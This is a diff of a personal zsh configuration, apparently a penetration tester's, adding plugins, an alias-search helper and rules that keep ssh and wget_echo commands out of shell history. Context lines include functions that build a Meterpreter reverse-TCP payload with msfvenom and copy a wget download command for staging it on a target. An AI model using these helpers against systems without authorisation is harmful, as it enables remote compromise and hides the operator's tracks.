@@ -194,6 +194,10 @@ zinit light ogham/exa
 zinit ice wait="1" lucid from="gh-r"  fbin="amass/amass"  mv="amass* -> amass"   id-as="amass"
 zinit light OWASP/Amass
 
+# tmxu-powerline
+zinit ice wait="1" lucid cloneonly id-as="tmux_theme" cloneopts="--depth 1" reset atpull="cp -f ${HOME}/.config/default.sh ${HOME}/.zinit/plugins/tmux_theme/themes/default.sh"  atclone="cp -f ~/.config/default.sh ${HOME}/.zinit/plugins/tmux_theme/themes/default.sh"
+zinit light erikw/tmux-powerline
+
 # git-flow
 zinit ice wait="1" lucid as="null"  id-as="git-flow" mv="%ID% -> git-flow.sh" atclone="chmod u+x git-flow.sh;export INSTALL_PREFIX=${HOME}/.local/bin;./git-flow.sh"
 zinit snippet https://raw.github.com/nvie/gitflow/develop/contrib/gitflow-installer.sh
@@ -371,6 +375,8 @@ alias install="~/.config/install.sh"
 alias prz='proxychains4 -q zsh'
 alias pr='proxychains4 -q'
 alias cedit='dotbare fedit'
+#}}}
+#function {{{
 function _z() { _zlua "$@"; }
 function ffufr() {
   ffuf -c -w "/path/to/SecLists/Discovery/Web-Content/$1" -u "$2/FUZZ" -recursion
@@ -393,6 +399,8 @@ function ffufb(){
 # 不记录 mv
 # 不记录 locate
 # 不记录 find
+# 不记录 ssh
+# 不记录 wget_echo
 # 不记录以空格开头的命令， 用于执行一些不希望被记住的命令
 zshaddhistory() {
     emulate -L zsh
@@ -420,6 +428,12 @@ zshaddhistory() {
     elif [[ $1 = "mv"* ]] ; then
         return 1
     elif [[ $1 = "x"* ]] ; then
+        return 1
+    elif [[ $1 = "whence"* ]] ; then
+        return 1
+    elif [[ $1 = "wget_echo"* ]] ; then
+        return 1
+    elif [[ $1 = "ssh"* ]] ; then
         return 1
     elif [[ $1 = " "* ]] ; then
         return 1
@@ -509,7 +523,7 @@ functio bash_shell(){
 function linux_shell(){
     msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$LOCAL_IP LPORT=443 --platform linux -f elf -o /tmp/temp
     cd /tmp
-    echo "wget http://$LOCAL_IP:8080/temp"
+    echo "wget http://$LOCAL_IP:8080/temp" | clipcopy
 }
 function wget_echo(){
     echo "wget http://$LOCAL_IP:8080/$1" | tee | clipcopy
@@ -536,6 +550,9 @@ function src() {
 	else
 		exec "$shell"
 	fi
+}
+function alias-search(){
+    alias | fzf
 }
 zinit ice id-as="p10k.zsh"
 zinit snippet $(echo ${HOME}/.p10k.zsh)
